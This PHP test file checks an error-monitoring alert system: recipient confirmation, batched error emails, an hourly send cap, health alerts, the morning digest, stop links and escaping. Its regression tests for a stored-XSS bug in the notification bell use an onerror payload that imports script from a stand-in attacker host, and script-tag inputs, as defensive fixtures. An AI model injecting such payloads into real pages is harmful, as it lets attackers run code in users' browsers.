<?php
// /tests/monitor/alerts_test.php — who is told what, and never a storm.

$db = monitor_test_db();
$now = monitor_test_clock('2026-11-11 10:00:00');
$GLOBALS['mt_mail'] = [];

// ---- Recipients: nothing is sent before the owner of the address confirms
$r = monitor_recipient_add($db, 'Owner@Example.org', 1);
ok('adding an address sends a confirmation link', $r['ok'] && count($GLOBALS['mt_mail']) === 1);
$mail = $GLOBALS['mt_mail'][0];
eq('…to that address, lowercased', 'owner@example.org', $mail['to']);
preg_match('#monitor_confirm\.php\?t=([0-9]+\.[0-9a-f]{48})#', $mail['text'], $m);
ok('…carrying a confirmation link', isset($m[1]));
eq('until it is clicked the address gets no alerts', [], monitor_recipients_active($db));
eq('adding it twice is fine (a fresh link)', true, monitor_recipient_add($db, 'owner@example.org', 1)['ok']);
eq('…and the first link no longer works', false, monitor_recipient_confirm($db, $m[1])['ok']);
preg_match('#monitor_confirm\.php\?t=([0-9]+\.[0-9a-f]{48})#', end($GLOBALS['mt_mail'])['text'], $m2);
eq('a wrong secret is refused', false, monitor_recipient_confirm($db, preg_replace('/.$/', '0', $m2[1]) === $m2[1] ? preg_replace('/.$/', '1', $m2[1]) : preg_replace('/.$/', '0', $m2[1]))['ok']);
monitor_test_clock('2026-11-19 10:00:00');
eq('an expired link is refused', false, monitor_recipient_confirm($db, $m2[1])['ok']);
monitor_test_clock('2026-11-11 10:05:00');
$c = monitor_recipient_confirm($db, $m2[1]);
ok('the latest link confirms', $c['ok'] && $c['email'] === 'owner@example.org');
eq('confirmed addresses receive alerts', ['owner@example.org'], array_column(monitor_recipients_active($db), 'email'));
eq('an invalid address is refused', false, monitor_recipient_add($db, 'not-an-address', 1)['ok']);
eq('an address already receiving is not added twice', false, monitor_recipient_add($db, 'owner@example.org', 1)['ok']);

// ---- New errors: ONE message for all of them, once
$GLOBALS['mt_mail'] = [];
for ($i = 0; $i < 3; $i++) {
    monitor_test_record($db, ['kind' => 'exception', 'level' => 'fatal', 'exception_class' => 'RuntimeException', 'message' => 'Boom <script>alert(1)</script> ' . $i, 'line' => 10 + $i]);
}
monitor_test_record($db, ['level' => 'warning', 'message' => 'Just a warning', 'line' => 50]);
$n = monitor_alert_new_errors($db, $db);
eq('three new fatal problems announced together', 3, $n);
eq('…in one email', 1, count($GLOBALS['mt_mail']));
has('…titled for all of them', $GLOBALS['mt_mail'][0]['subject'], '3 new or returning errors');
lacks('…with every value escaped in the HTML', $GLOBALS['mt_mail'][0]['html'], '<script>alert(1)</script>');
has('…and a stop link', $GLOBALS['mt_mail'][0]['html'], 'monitor_confirm.php?stop=');
eq('one bell for each active Super_Admin (not the frozen one, not the member)', [1],
    array_map('intval', $db->query('SELECT DISTINCT user_id FROM system_notifications')->fetchAll(PDO::FETCH_COLUMN)));
eq('a warning waits for the morning summary', 1, (int) $db->query("SELECT COUNT(*) FROM monitor_error_groups WHERE alerted_at IS NULL AND level = 'warning'")->fetchColumn());
eq('the next run sends nothing more', 0, monitor_alert_new_errors($db, $db));

// A browser error is told once three people met it.
$js = ['kind' => 'js', 'level' => 'error', 'exception_class' => 'TypeError', 'message' => 'TypeError: x is null', 'file' => '/assets/js/a.js', 'line' => 3, 'frames' => []];
monitor_test_record($db, $js + ['request' => ['user_id' => 11]]);
eq('one person: not yet', 0, monitor_alert_new_errors($db, $db));
monitor_test_record($db, $js + ['request' => ['user_id' => 12]]);
monitor_test_record($db, $js + ['request' => ['user_id' => 13]]);
eq('three people: told', 1, monitor_alert_new_errors($db, $db));

// ---- The hourly cap: an error storm sends at most 6 emails an hour
$GLOBALS['mt_mail'] = [];
for ($i = 0; $i < 10; $i++) {
    monitor_test_clock('2026-11-11 10:' . str_pad((string) (10 + $i), 2, '0', STR_PAD_LEFT) . ':00');
    monitor_test_record($db, ['kind' => 'exception', 'level' => 'error', 'exception_class' => 'LogicException', 'message' => 'Storm ' . $i, 'line' => 200 + $i]);
    monitor_alert_new_errors($db, $db);
}
ok('a storm of new errors sends at most 6 emails in the hour', count($GLOBALS['mt_mail']) <= 6, (string) count($GLOBALS['mt_mail']));
eq('…and what did not fit waits for the next hour, not lost', true, (int) $db->query("SELECT COUNT(*) FROM monitor_error_groups WHERE alerted_at IS NULL AND title LIKE 'Storm%'")->fetchColumn() > 0);
monitor_test_clock('2026-11-11 11:30:00');
monitor_alert_new_errors($db, $db);
eq('an hour later the rest go out in one message', 0, (int) $db->query("SELECT COUNT(*) FROM monitor_error_groups WHERE alerted_at IS NULL AND title LIKE 'Storm%'")->fetchColumn());

// ---- Spikes
$GLOBALS['mt_mail'] = [];
$sp = monitor_test_record($db, ['message' => 'Spiky', 'line' => 400]);
$db->prepare('UPDATE monitor_error_groups SET spiked_at = ? WHERE id = ?')->execute([monitor_fmt(), $sp['group_id']]);
eq('a spike is told', 1, monitor_alert_spikes($db, $db));
eq('…once', 0, monitor_alert_spikes($db, $db));

// ---- Health: on turning red, every 6 hours while red, and on recovery
monitor_test_clock('2026-11-11 14:00:00');
$GLOBALS['mt_mail'] = [];
monitor_checks_store($db, [monitor_check('disk', 'Server', 'Disk space', 'bad', '97% used', 'Clean up'), monitor_check('logs', 'Server', 'Log files', 'bad', 'big')], monitor_time());
eq('an urgent check turning red is told (log size is not urgent)', 1, monitor_alert_health($db, $db));
has('…with what to do', $GLOBALS['mt_mail'][0]['text'] ?? '', 'What to do: Clean up');
monitor_test_clock('2026-11-11 15:00:00');
eq('still red an hour later: quiet', 0, monitor_alert_health($db, $db));
monitor_test_clock('2026-11-11 20:30:00');
eq('still red after 6 hours: told again', 1, monitor_alert_health($db, $db));
monitor_checks_store($db, [monitor_check('disk', 'Server', 'Disk space', 'ok', '60% used')], monitor_time());
eq('green again: told it recovered', 1, monitor_alert_health($db, $db));
eq('…once', 0, monitor_alert_health($db, $db));

// ---- The morning summary
$GLOBALS['mt_mail'] = [];
monitor_test_clock('2026-11-12 07:30:00');
eq('before 08:00: not yet', false, monitor_alert_digest($db, $db));
monitor_test_clock('2026-11-12 08:01:00');
eq('at 08:00: sent', true, monitor_alert_digest($db, $db));
has('…a summary email', $GLOBALS['mt_mail'][0]['subject'] ?? '', 'morning summary');
eq('…once a day', false, monitor_alert_digest($db, $db));

// ---- The stop link
$recipient = $db->query("SELECT * FROM monitor_recipients WHERE email = 'owner@example.org'")->fetch();
$stop = monitor_stop_token($recipient);
eq('a tampered stop link is refused', false, monitor_recipient_stop($db, substr($stop, 0, -1) . (substr($stop, -1) === '0' ? '1' : '0'))['ok']);
eq('the stop link works', true, monitor_recipient_stop($db, $stop)['ok']);
eq('…and the address gets nothing more', [], monitor_recipients_active($db));

// ---- Mail failure is logged, never thrown
$GLOBALS['mt_mail_fail'] = true;
$r = monitor_recipient_add($db, 'second@example.org', 1);
ok('a failed confirmation email is reported, not thrown', !$r['ok'] && str_contains((string) $r['error'], 'could not be sent'));
$GLOBALS['mt_mail_fail'] = false;
ok('every alert is in the alert log', (int) $db->query('SELECT COUNT(*) FROM monitor_alert_log')->fetchColumn() > 5);

// ---- Browser text never reaches the bell or a subject (review, 11 Nov: stored XSS via the bell)
$x = monitor_test_db();
monitor_test_clock('2026-11-14 10:00:00');
$GLOBALS['mt_mail'] = [];
monitor_recipient_add($x, 'xss@example.org', 1);
preg_match('#t=([0-9]+\.[0-9a-f]{48})#', end($GLOBALS['mt_mail'])['text'], $xm);
monitor_recipient_confirm($x, $xm[1]);
$GLOBALS['mt_mail'] = [];
$evil = ['kind' => 'js', 'level' => 'error', 'exception_class' => 'Error', 'file' => '/a.js', 'line' => 1, 'frames' => [],
         'message' => 'Error: <img src=x onerror="import(\'//evil.example/x.js\')">'];
foreach (['198.51.100.1', '198.51.100.2', '198.51.100.3'] as $ip) {
    monitor_test_record($x, $evil + ['request' => ['user_id' => null, 'role' => 'guest', 'ip' => $ip]]);
}
eq('three addresses: the browser error is announced', 1, monitor_alert_new_errors($x, $x));
$bell = $x->query('SELECT title, message FROM system_notifications ORDER BY id DESC LIMIT 1')->fetch();
lacks('the bell carries no markup', $bell['title'] . $bell['message'], '<');
lacks('…and none of the browser\'s text', $bell['message'], 'onerror');
lacks('the email subject carries none of it either', $GLOBALS['mt_mail'][0]['subject'] ?? '', 'img');
lacks('…nor the email body', $GLOBALS['mt_mail'][0]['html'] ?? '', 'onerror');
$y = monitor_test_db();
foreach (['UA one', 'UA two', 'UA three'] as $ua) {
    monitor_test_record($y, $evil + ['request' => ['user_id' => null, 'role' => 'guest', 'ip' => '198.51.100.9', 'ua' => $ua]]);
}
eq('one address with three browsers is one person, not three', 0, monitor_alert_new_errors($y, $y));
monitor_test_record($x, ['kind' => 'exception', 'level' => 'error', 'exception_class' => 'Error', 'message' => 'Bad <script>alert(1)</script> "quoted" value', 'line' => 77]);
monitor_test_clock('2026-11-14 12:00:00');
monitor_alert_new_errors($x, $x);
$bell = $x->query('SELECT message FROM system_notifications ORDER BY id DESC LIMIT 1')->fetchColumn();
lacks('server error text in the bell is made plain too', (string) $bell, '<');
lacks('…without quotes', (string) $bell, '"');
eq('plain text keeps the words', 'Bad alert(1) quoted value', monitor_plain('Bad <script>alert(1)</script> "quoted" value'));

// ---- A server error is never crowded out by browser errors waiting for their third person
$z = monitor_test_db();
for ($i = 0; $i < 45; $i++) {
    monitor_test_record($z, ['kind' => 'js', 'level' => 'error', 'exception_class' => 'TypeError', 'message' => 'TypeError: lone ' . $i, 'file' => '/b.js', 'line' => $i + 1, 'frames' => []]);
}
monitor_test_record($z, ['kind' => 'exception', 'level' => 'error', 'exception_class' => 'LogicException', 'message' => 'The real server error', 'line' => 5]);
monitor_alert_new_errors($z, $z);
ok('45 one-person browser errors do not hide a server error', $z->query("SELECT alerted_at FROM monitor_error_groups WHERE title = 'The real server error'")->fetchColumn() !== null);

// ---- Over the email cap, an alert waits (bell included) rather than being marked sent
$c = monitor_test_db();
$GLOBALS['mt_mail'] = [];
monitor_recipient_add($c, 'cap@example.org', 1);
preg_match('#t=([0-9]+\.[0-9a-f]{48})#', end($GLOBALS['mt_mail'])['text'], $cm);
monitor_recipient_confirm($c, $cm[1]);
for ($i = 0; $i < 6; $i++) {
    monitor_alert_log($c, 'email', 'errors', 'earlier alert', 1, true);
}
monitor_test_record($c, ['kind' => 'exception', 'level' => 'error', 'exception_class' => 'LogicException', 'message' => 'Waits for room', 'line' => 6]);
eq('six emails this hour: the new error waits', 0, monitor_alert_new_errors($c, $c));
ok('…not marked as sent', $c->query("SELECT alerted_at FROM monitor_error_groups WHERE title = 'Waits for room'")->fetchColumn() === null);
eq('…and no bell went out without it', 0, (int) $c->query('SELECT COUNT(*) FROM system_notifications')->fetchColumn());
